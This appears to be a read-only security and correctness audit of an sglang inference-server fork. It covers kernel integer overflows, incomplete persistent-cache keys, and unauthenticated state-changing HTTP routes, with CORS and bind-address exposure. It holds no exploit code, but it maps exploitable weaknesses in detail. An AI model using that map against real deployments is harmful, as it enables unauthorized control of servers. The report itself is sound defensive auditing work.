# AUDIT #506 — never-swept axes

Base: `d653405223` (`origin/integration/r3-probe-next2`), worktree
`/spinning/wt-506-unswept`, branch `docs/unswept-axes-506`.
Read-only audit. No behaviour change is part of this branch.

Catalog sections read: §1 (uneven parallelism), §3 (memory tiers), §8 (GGUF
stack), §9 (quant lanes), §10 (determinism gates), §12 (robustness canon),
§13 (serving surface), §14 (dashboard), §15 (model bring-ups), §16
(measurement infra), §17 (combination matrix).

Companion sweep #505 (`docs/silent-wrongness-505`) covers warnings /
invariants / defaults; the four axes here are disjoint from it.

Operating-point constants used in every arithmetic bound below (sourced, not
assumed):

| constant | value | source |
|---|---|---|
| DSV4-Flash hidden_size | 4096 | `/spinning/llm_stuff/club-3090/models-cache/DeepSeek-V4-Flash-0731-GGUF/UD-Q3_K_XL/config.json` |
| DSV4-Flash moe_intermediate_size | 2048 | same |
| DSV4-Flash n_routed_experts | 256 | same |
| DSV4-Flash num_hidden_layers | 43 | same |
| DSV4-Flash vocab_size | 129280 | same |
| DSV4-Flash max_position_embeddings | 1048576 | same |
| DSV4-Flash index_topk / index_n_heads | 512 / 64 | same |
| int32 ceiling | 2^31 = 2147483648 | — |

Classification key: **PRIO** = reachable at a configuration this fork ships
for, with real damage. **Backlog** = real, needs an unusual configuration.
**Pin** = not reachable today; the entry records the exact threshold at which
it becomes reachable, so a later geometry change re-opens it.

---

## Axis 1 — index / dtype overflow

Method: every site below was read at source and its maximum reachable product
computed from the table above. Sites are grouped by where the arithmetic
happens (CUDA / Triton / Python).

### 1.1 Findings

| ID | file:line | arithmetic | max reachable product | verdict |
|---|---|---|---|---|
| A1-1 | `sgl-kernel/csrc/quantization/gguf/moe.cuh:61` | `(char*)vx + exp_idx * exp_stride`, both `int` (`:28`) | **bytes of the whole local expert tensor**; overflows once w13 (or w2) exceeds 2 GiB on one rank | **PRIO** |
| A1-2 | `sgl-kernel/csrc/gemm/per_token_group_quant_8bit_v2.cu:432` | `static_cast<int>(input.numel()) / group_size` — narrows *before* dividing | needs `numel > 2^31` = e.g. 300k tokens x 7168 | **Pin** (and see 1.3: v1 does it correctly) |
| A1-3 | `sgl-kernel/csrc/quantization/gguf/moe_vec.cuh:30` | `expert * nrows * blocks_per_row`, all `int` | block units (32 elems/block): 256 x 4096 x 128 = 1.34e8 | Pin (16-32x headroom vs A1-1) |
| A1-4 | `sgl-kernel/csrc/kvcacheio/transfer.cu:23` | `const int total_chunks = item_size_bytes / 8` | per-page KV item; would need a 17 GB single item | Pin |
| A1-5 | `python/sglang/srt/distributed/device_communicators/barlink_bar1_ext.py:538,545` | `int tid`, `int n4` on the non-K_GRID path | `n4` counts uint4 = 16 B units -> 34 GB buffer | Pin |
| A1-6 | `python/sglang/srt/layers/dcp/kernels.py:197-203,228,242` | `b_i32 * lses_stride_B + h_i32 * lses_stride_H`, deliberately int32 | LSE tensor is `[N,B,H]`; product <= B*H <= ~1.3e5 | Pin |
| A1-7 | `sgl-kernel/csrc/elementwise/copy.cu:49` | `int N = static_cast<int>(input.numel())` | `TORCH_CHECK`ed to N in {32,64,72} | Pin (non-issue) |
| A1-8 | `python/sglang/srt/mem_cache/unified_memory_pool.py:1110`, `python/sglang/srt/mem_cache/multi_ended_allocator.py:2233` | `(swa_phys_pages * ps + offsets).to(torch.int32)` | product is a token slot id, bounded by pool size in tokens (<= ~1e7 here) | Pin |
| A1-9 | `python/sglang/srt/mem_cache/unified_memory_pool.py:216` | `self._raw = torch.empty(total_bytes, dtype=torch.uint8)` — one flat multi-GiB buffer | numel > 2^31 for any pool > 2 GiB, but every consumer indexes through torch views (int64 strides) | Pin — becomes live the moment a custom kernel takes `_raw` and an `int` offset |
| A1-10 | `python/sglang/srt/layers/attention/dsv4/unified_kv_kernels/paged_decode.py:274,287,440` | `slot[:, None] * kv_stride_n` — `slot` is int32 (`kv_indices` is int32, `:20/:193`), `kv_stride_n` is `unified_kv.stride(0)` (`:743`), so the product is a Triton i32 multiply with no `.to(tl.int64)` anywhere in the directory | `stride(0)` = DSV4 head_dim 512; overflow at slot >= 2^31/512 = **4 194 304 rows in ONE layer's pool** | Pin — see 1.4b for the threshold in GiB |

### 1.2 A1-1 in detail (the one with a number that actually crosses)

`moe.cuh` declares the expert stride as `const int exp_stride` (`:28`,
repeated for all 11 quant instantiations) and the device code does

```
const block_q_t* x = (const block_q_t*)((char*)vx + exp_idx * exp_stride);
```

`exp_stride` is filled at the call site from `W.stride(0)`
(`sgl-kernel/csrc/quantization/gguf/gguf_kernel.cu:409` and the identical
argument in every other `case` of `ggml_moe_a8`, :428/:447/:466/:485/:504/
:523/:542/:561/:580/:599). `W` is the uint8 GGUF expert tensor
`[E, N, K_bytes]` handed in from
`python/sglang/srt/layers/quantization/gguf.py:1058` (w13) and `:1070` (w2),
so `stride(0)` is **bytes per expert** and the product `exp_idx * exp_stride`
is the byte offset of the last expert, i.e. approximately the size of the
whole local tensor. It is computed in 32-bit.

Threshold: overflow at `E_local * bytes_per_expert >= 2^31`, i.e. **a
per-rank, per-layer expert weight tensor larger than 2 GiB**. The result is a
negative offset — an out-of-bounds read far below the tensor, i.e. the same
failure mode as #109 but from a different cause (#109 was the expert-id
guard; this is the stride product, and the #109 fix at `gguf.py:1057` does
not touch it).

Numbers for DSV4-Flash (w13, the larger of the two):

- elements per expert = `2 * moe_intermediate * hidden` = `2*2048*4096` = 16 777 216
- Q4_K = 144 B / 256 elems = 0.5625 B/elem -> 9.44 MB per expert
- 256 experts (TP=1, no expert-dim sharding): **2.416e9 B > 2^31** -> the top
  ~28 experts index out of range
- Q5_K (0.6875 B/elem, present in `UD-Q4_K_XL` mixes): 11.53 MB/expert ->
  2.95e9 B, overflow from local expert 186 upward
- Q6_K (0.8203 B/elem): 13.76 MB/expert -> 3.52e9 B, overflow from 156 upward
- Q3_K (0.4297 B/elem, the `UD-Q3_K_XL` mix on disk): 7.21 MB/expert ->
  1.85e9 B, **under** the ceiling

Reach on *this* rig: masked, because expert-dim TP sharding leaves ~86 local
experts at TP=3 (0.81e9 B for Q4_K). At TP=2 it is 128 local experts =
1.21e9 B, still under. TP=1 with a Q4_K/Q5_K/Q6_K 256-expert GGUF crosses it.
Per the standing rule that this rig's measurements are a lower bound and
never a feasibility verdict about a general feature, that is not a reason to
downgrade the finding: the kernel ships for every rig, and a host with enough
VRAM for a 256-expert Q4_K MoE is exactly the configuration that hits it.

Also note the path condition: `ggml_moe_a8` (MMQ) is the *prefill* expert
kernel and is entered only for `x.shape[0] <= _MMQ_MAX_TOKENS`
(`gguf.py:927`, default 8 via `SGLANG_GGUF_MMQ_MAX_TOKENS`), so the decode
path (`ggml_moe_a8_vec`) is A1-3, not A1-1 — and A1-3 has 16-32x more
headroom because its stride is in *block* units, not bytes. That asymmetry is
the whole reason A1-1 is the only PRIO here.

Suggested fix shape (not applied on this branch): widen `exp_stride` to
`int64_t` through the 11 `ggml_moe_*_q8_1_cuda` signatures and the device
templates; `W.stride(0)` is already `int64_t` at the call site, so the change
is purely removing an implicit narrowing.

### 1.3 A1-2 in detail (a real narrowing, currently out of reach)

`per_token_group_quant_8bit_v2.cu:432` casts to `int` and *then* divides:

```
const int num_groups = static_cast<int>(input.numel()) / group_size / (...);
```

The v1 file does the same computation in the safe order —
`sgl-kernel/csrc/gemm/per_token_group_quant_8bit.cu:128`:
`const int num_groups = input.numel() / group_size;` (int64 division, then
narrow). Two versions of the same kernel disagree about the order; only one
of them is correct for `numel > 2^31`. Reaching it needs an activation
tensor above 2.1e9 elements (about 300k tokens at hidden 7168), far above the
`--max-num-batched-tokens` values this rig runs, hence Pin — but the fix is a
one-token change and removes a latent divergence between the two files.

### 1.4b A1-10 in detail (the one that looked like the biggest find and is not)

`paged_decode.py:272-278` gathers KV with

```
unified_kv_ptr + slot[:, None] * kv_stride_n + d_offs[None, :] * kv_stride_d
```

`slot` comes from `tl.load(kv_indices_ptr + ...)` and `kv_indices` is
documented and passed as **int32** (`:20`, `:193`, `:736`); `kv_stride_n` is
`unified_kv.stride(0)` (`:743`), a small Python int that Triton specializes to
`i32`. Triton does not promote on multiplication, so the product is an i32
multiply that wraps to a negative offset past its ceiling — the classic paged
attention overflow shape. Nothing in
`python/sglang/srt/layers/attention/dsv4/unified_kv_kernels/` casts to
`tl.int64` (checked across the whole directory); the same expression is at
`:287` (scales) and `:440` (the second kernel in that file), and the prefill
twin repeats it with `tl.constexpr` strides at
`unified_kv_kernels/paged_prefill.py:135,173` (`pkv_stride_n` / `ekv_stride_n`,
declared at `:79`/`:81`) — a constexpr operand does not widen the result.

It does not currently bind, and the reason is the layout, not luck.
`unified_kv` is **per layer**:
`unified_kv[L]: [swa_pages + padded_compress_rows, head_dim]`
(`python/sglang/srt/mem_cache/deepseek_v4_memory_pool.py:389-393`, accessor
`get_unified_kv(local_layer_id)` at `:445`), with
`head_dim = qk_nope_head_dim + qk_rope_head_dim` (`:415`) = 448 + 64 = 512 for
DSV4-Flash, and 576 bytes per row (FP8 nope + BF16 rope, `:101`, `:114`).

Threshold: 2^31 / 512 = **4 194 304 rows in a single layer's pool**, i.e.
4 194 304 x 576 B = **2.25 GiB of KV for ONE layer**, which at 43 layers means
about **97 GiB of KV on one rank**. That is out of reach on any single rank
this fork targets, so Pin.

What re-opens it, explicitly: a model with few layers and a large per-layer
pool, a unified pool that stops being per-layer, or a head_dim large enough
to pull the row threshold down (the threshold scales as 1/head_dim, so it is
`2^31 / head_dim` rows regardless of model). The fix, if it is ever wanted, is
one `.to(tl.int64)` on `slot` — the same shape upstream applies elsewhere.

### 1.4 What Axis 1 did NOT cover (honest coverage)

- `sgl-kernel/csrc` was swept for **byte-pointer arithmetic** (`(char*)p + x`
  / `(uint8_t*)p + x` without an int64 operand): exactly one hit, A1-1. It
  was **not** exhaustively swept for `int` element-index arithmetic — that is
  thousands of sites, and the ones that matter are those whose stride is in
  bytes or whose extent is a whole tensor. The named families read:
  gguf (moe, moe_vec, mmvq, mmq, dequantize, gguf_kernel), kvcacheio,
  elementwise/copy, elementwise/pos_enc, gemm/per_token_group_quant (v1+v2),
  moe/moe_align_kernel, barlink BAR1 inline CUDA.
- Triton: `layers/dcp/kernels.py` read in full;
  `layers/attention/dsv4/unified_kv_kernels/paged_decode.py` read in full
  (A1-10) and the directory swept for `tl.int64` (no hits);
  `layers/attention/dsv4/indexer.py` read for offset dtype (the heavy indexer
  math is chunked torch, not a custom flat-offset kernel —
  `indexer.py:237,552,585,826,1081` are id tensors bounded by page/topk
  counts). `paged_prefill.py` was NOT read in
  full; only its `slot * stride` sites (`:79,81,135,173`) were matched and
  they share A1-10's threshold. The other Triton files were
  **not** read line-by-line. Scale of what is left: 102 files under
  `python/sglang/srt` contain `tl.arange` (i.e. are Triton kernels) and only
  47 of them mention `tl.int64` anywhere, so the widen-the-index convention
  exists in this tree but is not universal, and 55 kernel files have not been
  checked for A1-10's shape (`<int32 index loaded from a table> * <stride>`).
  That is the single largest open surface this axis leaves behind.
- Python: `torch.int32` sites in `mem_cache/`, `managers/kv_session_offload.py`,
  `memtier/`, `distributed/device_communicators/barlink*` were scanned. Every
  int32 tensor found there carries an **id** (page id, token slot, request
  index, expert id), not a product, and is bounded by pool size; no int32
  tensor was found that carries a byte count or an element-count product.
  `models/`, `lora/`, `multimodal/`, `speculative/` int32 sites were not read.
- No GPU window was taken; nothing here is a measurement, all of it is
  arithmetic on read source plus a config file on disk.

---

## Axis 3 — persistent-cache key completeness (the #241 class, generalised)

Method: inventory every artifact this tree persists across process lifetimes,
then for each one compare *what changes the content* against *what appears in
the key or path*. Every difference is a collision candidate and gets a
scenario.

Already-solved instances are listed as SOLVED and are not re-reported: #241
(kv-dtype in HiCache keys — now covered by `compute_model_identity_hash`,
`python/sglang/srt/mem_cache/hicache_storage.py:27-50`), the JIT-cache family
(#172/#181/#222/#304), the VLLM_COMMIT buster, #188 (measured-budget stale
leftover), #397 (misattributed card poisoning the hardware profile — guarded
by `DeviceOrderUnresolvedError`, `python/sglang/srt/uneven_perf.py:580-589`),
#208 (CuTe-DSL on-disk JIT cache filed under device 0's arch — guarded by
`python/sglang/srt/utils/cute_dsl_arch.py`).

### 3.1 Inventory

| artifact | writer | key / path composition | verdict |
|---|---|---|---|
| `~/.cache/sglang/hw_profile-<sha1>.json` | `uneven_perf.py:611-622` | sorted GPU UUIDs + driver + `PROFILE_VERSION` | complete; migration reads older versions explicitly (`:626-635`) |
| `~/.cache/sglang/kv_budget-<sha1>.json` | `uneven_perf.py:2596-2603` | 24-field server-args fingerprint (`:2520-2557`) + pp_rank path suffix (`model_runner_kv_cache_mixin.py:790-802`) | **A3-3** gaps |
| `~/.cache/sglang/card_probe-<sha1>.json` | `rigmon/card_probe.py:371-380` | sorted UUIDs + driver + `CARD_PROBE_VERSION` | writer complete, **readers discard the key: A3-1** |
| `~/.cache/sglang/graph_mem_anchors.json` | `planner/graphmem.py:298-318` | model basename, tp, spec shape, kv dtype, decode-bs count | **A3-4** gaps |
| `~/.cache/sglang/power_profile.json` | `planner/power_calibration.py:101` | fixed path, rows self-keyed by uuid+arch | **A3-5** |
| `~/.cache/sglang/split_probe.jsonl` | `planner/rig_profile_source.py:149` | append-only JSONL, no key | rows carry their own card ids; reader filters — Pin |
| `~/.cache/sglang/jtok_counter.json` | `planner/jtok_counter.py:378` | record key `(model, config_label, lanes)` (`:151-152`) | **A3-7** |
| HiCache storage pages | `mem_cache/hicache_storage.py:396-437` | model_name + identity hash (model_path, revision, dtype, quantization, kv_cache_dtype) + tp_rank/tp_size + pp + cp | **A3-2** gap on the fork's uneven axes |
| KV session spill blobs | `managers/kv_session_spill_destination.py:215-239` | 14-field fingerprint incl. `rank_tp_ratio`, `cp_prefix`, `head_num`, `store_dtype` | complete — the reference implementation in this tree |
| TensorRT engines | `video_enhance/engine_cache.py:79-121` | onnx sha256, NVML uuid, device name, driver, runtime+version, precision, shape triplet, builder flags | complete — the other reference implementation |
| RIFE weights | catalog §13 / `video_enhance/rife.py:316` | sha256 pin per version, refuses unpinned re-download | complete |
| Hibernate shards + manifest | `model_loader/hibernate.py:389-397` | per-rank byte-hash over (name, shape, dtype, bytes), re-verified at restore (`:684-689`) | complete — content-addressed, verified |
| CuTe-DSL JIT cache | `$CUTE_DSL_CACHE_DIR` | arch forced per rank by `utils/cute_dsl_arch.py` | SOLVED (#208) |
| deep_gemm JIT | `layers/deep_gemm_wrapper/compile_utils.py:38-40` | `DG_JIT_CACHE_DIR` redirect only | not read further — see coverage |
| flashinfer autotune | `model_executor/runner/flashinfer_autotune.py:118-151` | flashinfer version / sm-arch / sha256(model_path, dtype, quantization, moe_runner_backend, tp, pp, dp, ep, hf-config class) / per-rank file | **A3-8** |

### 3.2 A3-1 — the card probe's key is written and then thrown away (PRIO)

The writer is explicit about why the key exists
(`python/sglang/srt/rigmon/card_probe.py:371-380`):

> Keyed on the driver on purpose: a driver update moves clock behaviour and
> the p2p verdict, and silently reusing rates across one is how a stale
> number outlives the hardware state it described.

Both readers ignore it and take the newest file by mtime:

- `python/sglang/srt/planner/solver_api.py:80-93` — globs
  `card_probe-*.json`, sorts by mtime, returns the first that parses and has
  a truthy `cards` list. No comparison against the current rig's UUIDs or
  driver.
- `python/sglang/srt/planner/rig_profile_source.py:132-145` — same shape,
  `max(files, key=os.path.getmtime)`.

`card_probe.default_cache_path()` (`card_probe.py:382-392`) computes exactly
the right path for the cards visible right now and is not used by either
reader.

Scenario (reachable on this rig): a probe is taken while the GPU arbiter has
handed out only two of the three cards, or with `CUDA_VISIBLE_DEVICES` set to
a subset. That probe lands under its own digest and is now the newest file.
Every later planner/solver call — including a three-card plan — is scored on
a two-card probe with the missing card absent from `cards` and the pair
matrix. Second scenario: a driver rollback. The correct pre-rollback digest
is still on disk, but the post-update file is newer and wins, so the solver
uses rates measured under the other driver — precisely what the writer's
comment says must not happen.

Suggested fix shape: readers call `default_cache_path()` (or compare the
probe's `cards`/`driver` against the live inventory) and treat a mismatch as
a miss, which already has a remedy path (`_card_probe_remedy()`,
`solver_api.py:114-124`).

### 3.3 A3-2 — HiCache page keys do not carry the uneven-TP shard vector (PRIO)

`HiCacheStorageConfig` (`python/sglang/srt/mem_cache/hicache_storage.py:53-78`)
has no `rank_tp_ratio` / `rank_kv_ratio` field, and the key suffix built at
`:415-437` uses `_{tp_rank}_{tp_size}` for the non-MLA case.

Under this fork's uneven TP, `tp_rank`/`tp_size` do NOT determine a rank's
kv-head count: `--rank-tp-ratio 13,6,6` and an even split are both
`tp_rank=0, tp_size=3`, with different head counts and therefore different
bytes per stored page. Two boots of the same model that differ only in the
ratio vector produce the same key suffix and the same page hashes (page
hashes cover token ids only, `hicache_storage.py:29-31`), so the second boot
reads pages written under the first boot's shard geometry.

The sibling module already treats this as key-relevant and says so —
`python/sglang/srt/managers/kv_session_spill_destination.py:215-239` puts
`rank_tp_ratio`, `head_num`, `head_dim`, `cp_prefix` and `store_dtype` in its
fingerprint, with the docstring "Every axis that shapes the KV bytes or their
owner split is included". HiCache is the same problem with a shorter key.

Reach: needs a persistent storage tier (`--hicache-storage-backend file` or
any backend whose entries outlive the process), which is what makes #241's
argument apply here verbatim. Without a persistent tier the keys never
outlive a boot and this is unreachable.

### 3.4 A3-3 — measured KV-budget fingerprint omits footprint-changing flags (Backlog)

`measured_kv_budget_fingerprint_fields`
(`python/sglang/srt/uneven_perf.py:2520-2557`) fingerprints 24 fields and
documents its deliberate exclusions (`:2513-2516`: `rank_mlp_ratio` and the
chosen weight vector, because moving weights between boots of the same config
is the point). The record it keys is the *post-capture VRAM leftover*
(`model_executor/model_runner_kv_cache_mixin.py:1084-1128`), which is the
allocator/reserved state after CUDA-graph capture — so anything that changes
graph residency or backend workspace changes the content.

Absent from the fields, present in `server_args`, and content-changing:

| flag | source | why it changes the leftover |
|---|---|---|
| `attention_backend` | `server_args.py:2913` | backend workspaces are part of the post-capture reserved bytes; `planner/graphmem.py:100-103` calls the fixed per-graph term "flashinfer workspace" outright |
| `disable_cuda_graph` | `server_args.py:3089` | with capture off there is no graph residency at all, so the leftover is a different quantity |
| `dtype` | `server_args.py:912` | weight bytes; `quantization` is fingerprinted but `dtype` is not |
| `enable_hierarchical_cache` | `server_args.py:3883` | adds device-side buffers to the same balance |
| `rank_vocab_ratio` | `server_args.py:2380` | changes the lm_head shard and the logits buffer per rank; `rank_tp_ratio`/`rank_kv_ratio` ARE fingerprinted, so the omission is at least an undocumented asymmetry (it may be deliberate under the `rank_mlp_ratio` rationale, in which case it belongs in the exclusion comment) |

Consequence: `rest_memory += correction_gb`
(`model_runner_kv_cache_mixin.py:671`) applies a correction measured under a
different backend. It is logged (`:663-670`), but the log states the
correction, not the provenance mismatch, so nothing on the boot path can tell
the two apart. This is #188's own failure mode along an axis #188 did not
close.

### 3.5 A3-4 — graph-memory anchors keyed without the backend that produces them (Backlog)

`anchor_key` (`python/sglang/srt/planner/graphmem.py:298-318`) uses model
basename, tp, spec shape, kv dtype, and the decode capture-bs *count*. The
module's own heuristic constant it replaces is described as the "Fixed
workspace per captured graph kind (flashinfer workspace, pool bookkeeping)"
(`:99-103`), i.e. the quantity is backend-dependent by the module's own
account, yet `attention_backend` is not in the key. `page_size` is likewise
absent. A prospective config whose key matches gets the measured numbers with
provenance "measured" (`:33-36`), so a backend switch silently inherits the
other backend's anchor and is labelled measured rather than estimate.

Note also `nbs:{len(bs)}` — the anchor is keyed on the *number* of capture
batch sizes, not the list. Two different `--cuda-graph-bs` lists of equal
length collide.

### 3.6 A3-5 / A3-7 / A3-8 — lower-severity gaps (Backlog / Pin)

- **A3-5** `power_profile.json` (`planner/power_calibration.py:101`) is one
  fixed path, "a fresh run overwrites it". Rows are self-describing
  (uuid + arch, `:122-140`), so a wrong-card read is not possible, but a run
  taken over a card subset overwrites and drops the absent cards' rows, and
  the file carries no driver key even though `card_probe.py:373-378` argues
  the driver moves clock behaviour — the same physical dependence, keyed in
  one artifact and unkeyed in the other. Backlog (inconsistency).
- **A3-7** `jtok_counter.json` record key is
  `(model, config_label, lanes)` (`planner/jtok_counter.py:151-152`). J/token
  on a heterogeneous rig depends on which cards ran the config; card identity
  enters the key only if the caller encoded it in the free-form
  `config_label`. Pin — the key's completeness is delegated to callers, which
  is the weakness; a caller sweep would be needed to say whether it currently
  binds.
- **A3-8** flashinfer autotune profiles
  (`model_executor/runner/flashinfer_autotune.py:118-151`) are keyed on
  version/arch/model/parallel sizes and written per `tp_rank`. Absent:
  `kv_cache_dtype`, `page_size`, `attention_backend`, and the uneven shard
  vectors — a rank's GEMM shapes under `--rank-tp-ratio 13,6,6` differ from
  the even split at the same `tp_rank`. Pin: flashinfer's autotuner keys its
  own entries by op and shape, so a shape mismatch should miss rather than
  mis-hit; confirming that requires reading flashinfer, which was not done.

### 3.7 Stale claim found while sweeping (documentation only)

`python/sglang/srt/managers/kv_session_spill_destination.py:220-222` states
"The KV dtype IS part of this fingerprint -- unlike today's HiCache storage
keys". That is no longer true: `compute_model_identity_hash`
(`mem_cache/hicache_storage.py:27-50`) folds `kv_cache_dtype`, `dtype`,
`quantization` and `revision` into the HiCache suffix. Per the CLAUDE.md rule
that a comment asserting an invariant is a testable claim, this one now
fails; the comment should lose the comparison clause.

### 3.8 What Axis 3 did NOT cover (honest coverage)

- Read at source: uneven_perf hw-profile + kv-budget, card_probe (writer and
  both readers), graphmem, power_calibration, jtok_counter, rig_profile_source,
  solver_api, hicache_storage, kv_session_spill_destination, engine_cache,
  hibernate, cute_dsl_arch, flashinfer_autotune.
- NOT read: the deep_gemm JIT cache beyond the `DG_JIT_CACHE_DIR` redirect
  (`layers/deep_gemm_wrapper/compile_utils.py:38-40`); the torch/inductor
  compilation cache (`compilation/compiler_interface.py:179`,
  `compilation/inductor_pass.py:73-91`) — the JIT family is marked solved by
  the briefing and was taken at its word rather than re-derived; the
  non-`file` HiCache storage backends (mooncake, aibrix, simm, nixl) — only
  the file backend's key construction was read, and a backend that builds its
  own key could differ; `planner/self_update.py`, `planner/rig_artifact.py`,
  `planner/energy.py` results store, `model_loader/ci_weight_validation.py`,
  `utils/runai_utils.py`, `managers/load_snapshot.py`,
  `multimodal/mm_utils.py` multimodal cache, `video_enhance/chunk_worker.py`
  digests, `debug_utils/spec_state_hash.py`.
- No `gen_32k`-style fixture was located under that name; test fixtures were
  left to Axis 4.
- Nothing here was executed. Every claim is a read of key construction versus
  a read of what the artifact records.

---

## Axis 2 — state-changing HTTP endpoints

Read-only audit against worktree `/spinning/wt-506-unswept`, branch
`docs/unswept-axes-506`, base `d653405223`. No source file was modified.
Provenance (fork vs upstream) established by `git cat-file`/route-set diff
against `upstream/main` (`sgl-project/sglang`), not by inspection.

Catalog sections read: **§13 (Serving surface)** and **§14 (Dashboard)** of
`/spinning/wt-506-unswept/docs/dev/FEATURE_CATALOG.md`, plus all of
`/spinning/wt-506-unswept/CLAUDE.md`.

Catalog §13's line numbers have drifted by a few lines against the current
tree in one place only: the workbench routes are at 2191/2201/2213/2225, not
2191-2236 as a contiguous block ending at 2236 (the last one's decorator spans
2225-2227). Everything else in §13 verified at the stated line.

---

### 2.1 The auth story, in one place

Every route verdict below depends on this, so it is stated once with the
predicate at its source.

**The middleware is not installed unless a key is configured.**
`/spinning/wt-506-unswept/python/sglang/srt/entrypoints/http_server.py:2952-2963`:

```python
if (
    server_args.api_key
    or server_args.admin_api_key
    or app_has_admin_force_endpoints(app)
):
    from sglang.srt.utils.auth import add_api_key_middleware
    add_api_key_middleware(...)
```

`app_has_admin_force_endpoints` (`utils/auth.py:83-92`) scans for
`AuthLevel.ADMIN_FORCE`. **No endpoint in this tree carries ADMIN_FORCE** —
`rg 'ADMIN_FORCE' python/sglang/srt/entrypoints/http_server.py` yields only the
FIXME at `:2577-2584`, which says so explicitly:

```
# FIXME: In theory we should configure ADMIN_FORCE for some entrypoints, but doing so
# would currently cause all endpoints to go through add_api_key_middleware
# (even when neither api-key nor admin-api-key is configured).
```

So with neither key set, **there is no auth middleware in the ASGI stack at
all** — not a permissive middleware, an absent one.

**The decision function, when the middleware IS installed.**
`utils/auth.py:95-167`. Two levels are in use: `NORMAL` (the default for any
endpoint without the `@auth_level` decorator, `auth.py:78`) and
`ADMIN_OPTIONAL`. Exempt-path list, quoted verbatim (`auth.py:118-122`):

```python
if method == "OPTIONS":
    return AuthDecision(allowed=True)

if path.startswith("/health") or path.startswith("/metrics"):
    return AuthDecision(allowed=True)
```

That is a **prefix** match, so `/healthz`, `/health_generate`, `/metrics_foo`
and any future route beginning with those strings is unauthenticated by
construction. No state-changing route currently starts with either prefix.

**Executed decision matrix** (not desk-read — run with
`PYTHONPATH=/spinning/wt-506-unswept/python CUDA_VISIBLE_DEVICES=99`, calling
`decide_request_auth` directly with no `Authorization` header):

| keys configured | NORMAL route | ADMIN_OPTIONAL route |
|---|---|---|
| none | **allowed** | **allowed** |
| `--api-key` only | denied | denied |
| `--admin-api-key` only | **allowed** | denied |
| both | denied | denied |

The third row is the trap and is load-bearing for finding F2. The predicate
is `auth.py:161-167`:

```python
# Normal endpoints:
# - if api_key is configured, require api_key (even if admin_api_key is also configured)
# - otherwise allow (including the "admin_api_key only" case)
if api_key:
    return AuthDecision(allowed=_check_bearer_token(authorization_header, api_key))

return AuthDecision(allowed=True)
```

**Default bind host is loopback**: `server_args.py:2595`,
`host: A[str, "The host of the HTTP server."] = "127.0.0.1"`. But loopback is
not a boundary here, for two independent reasons:

1. **Wildcard CORS with credentials**, `http_server.py:595-601` (identical
   upstream at its `:435`):
   ```python
   app.add_middleware(
       CORSMiddleware,
       allow_origins=["*"],
       allow_credentials=True,
       allow_methods=["*"],
       allow_headers=["*"],
   )
   ```
   Any web page the operator opens can cross-origin POST to
   `http://127.0.0.1:30000/...` **and read the response**. A loopback bind
   stops the LAN; it does not stop the browser.
2. **This rig's own boot scripts bind `0.0.0.0`** and none of them sets a key:
   `scripts/nordstern/l0_rank.sh:177`, `scripts/satellite/boot_main_decode.sh:94`,
   `scripts/satellite/boot_satellite_prefill.sh:79`,
   `scripts/pp/pp_crossrig_rank.sh:133`, and `docs/rig-runbook.md:1810`.
   `rg -- '--api-key' scripts/ docs/rig-runbook.md` returns exactly one hit,
   `docs/rig-runbook.md:4198`, and it is not a boot flag
   (`export OPENAI_API_KEY=unused # any non-empty string unless --api-key is set`).
   **No boot recipe in this repository configures authentication.**

**gRPC mode has no auth by construction, and says so honestly** —
`server_args.py:7848-7852`:
```python
if self.api_key or self.admin_api_key:
    raise ValueError(
        "--grpc-port is incompatible with --api-key/--admin-api-key: "
        "the native gRPC listener bypasses HTTP auth middleware."
    )
```

**Auth-level resolution fails open to NORMAL** — `auth.py:70-80` returns
`AuthLevel.NORMAL` when no route matches or `route.matches(scope)` raises
(`except Exception: continue`). Consequence recorded as F9.

---

### 2.2 Route inventory

Auth column semantics: "covered?" = does the installed middleware gate it when
a key IS configured. Every row is unauthenticated when no key is set, because
the middleware is not installed at all (§0).

#### 2.2a Main runtime app — `python/sglang/srt/entrypoints/http_server.py`

Fork-added (route-set diff vs `upstream/main`):

| Route | Method | file:line | Auth level | Validation | Risk |
|---|---|---|---|---|---|
| `/kv_reshard` | POST | `http_server.py:1109` | ADMIN_OPTIONAL `:1110` | target vector allowlisted, `kv_reshard.py:340-344` | low |
| `/session_handover` | POST | `:1126` | ADMIN_OPTIONAL `:1127` | `action` free string, no enum check at the route | med |
| `/vram_budget` | POST | `:1149` | ADMIN_OPTIONAL `:1150` | floor + ceiling enforced, `vram_dial.py:508-532` | med |
| `/hibernate` | **GET**,POST | `:1706` | ADMIN_OPTIONAL `:1707` | **`hibernate_dir` unvalidated** | **high** |
| `/v1/images/generations` | POST | `:2013` | **NORMAL** (no decorator) | lane refusal `serving_images.py:62-105` | low |
| `/v1/images/edits` | POST | `:2022` | **NORMAL** | multipart, no size bound at route | med |
| `/v1/images/variations` | POST | `:2057` | **NORMAL** | named 501 | low |
| `/v1/audio/speech` | POST | `:2067` | **NORMAL** | lane refusal | low |
| `/v1/files` | POST | `:2079` | **NORMAL** | purpose allowlist + 2 GiB cap `store.py:245-254` | med |
| `/v1/files/{file_id}` | DELETE | `:2103` | **NORMAL** | dict lookup, no traversal `store.py:288` | med |
| `/v1/fine_tuning/jobs` | POST | `:2113` | **NORMAL** | tenant gate `service.py:269`; `base_model_path` unconfined `service.py:377-391` | med |
| `/v1/fine_tuning/jobs/{job_id}/cancel` | POST | `:2134` | **NORMAL** | dict lookup | low |
| `/x-htsglang/workbench/pause` | POST | `:2213` | **NORMAL** | reversible; `service.py:131-145` | med |
| `/x-htsglang/workbench/enqueue` | POST | `:2225` | **NORMAL** | **no queue cap, no magnitude bounds** | **high** |

Upstream, state-changing, same exposure (abridged to the consequential ones —
all are ADMIN_OPTIONAL unless noted, all open with no key):

| Route | Method | file:line | Note |
|---|---|---|---|
| `/generate`, `/encode`, `/classify` | POST/PUT | `:1021`, `:1085`, `:1097` | NORMAL |
| `/flush_cache` | GET,POST | `:1168` | GET mutates |
| `/add_external_corpus` | POST | `:1186` | `file_path` → server-side read, gated on `speculative_algorithm == "NGRAM"` (`tokenizer_control_mixin.py:155-157`) |
| `/remove_external_corpus` | POST | `:1211` | |
| `/clear_hicache_storage_backend` | GET,POST | `:1244` | GET mutates |
| `/hicache/storage-backend` | PUT / DELETE | `:1280` / `:1314` | **explicit `admin_api_key` check** at `:1289`, `:1321` — the only routes in the tree that do |
| `/start_profile`, `/stop_profile` | GET,POST | `:1356`, `:1367` | GET mutates; writes profile traces to disk |
| `/freeze_gc`, `/set_trace_level` | GET,POST | `:1388`, `:1378` | GET mutates |
| `/*_expert_distribution_record` | GET,POST | `:1401`,`:1412`,`:1423` | GET mutates |
